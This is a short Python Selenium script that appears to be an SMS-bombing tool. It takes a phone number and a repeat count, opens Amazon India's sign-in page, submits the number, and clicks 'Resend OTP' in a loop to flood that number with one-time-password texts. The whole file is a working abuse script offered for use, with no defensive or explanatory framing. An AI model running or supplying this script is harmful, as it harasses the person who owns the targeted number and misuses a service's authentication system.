from selenium import webdriver

phoneNo=input('Enter Number :')
times=int(input('No of times you want to send:'))

browser=webdriver.Chrome('//home//gaurav//Documents//chromedriver')
browser.get('https://www.amazon.in/ap/signin?openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fref%3Dgw_sgn_ib&openid.assoc_handle=inflex&openid.pape.max_auth_age=0&pf_rd_r=138F68TXFMMR5Z6JY94Z&pf_rd_p=970dc859-8786-48c1-9b53-8b797bba424a')



phone=browser.find_element_by_id('ap_email')
phone.send_keys(phoneNo)

conti=browser.find_element_by_id('continue')
conti.click()

sentotp=browser.find_element_by_id('continue')
sentotp.click()

for i in range(times):
	click=browser.find_element_by_link_text("Resend OTP")
	click.click()

browser.quit()
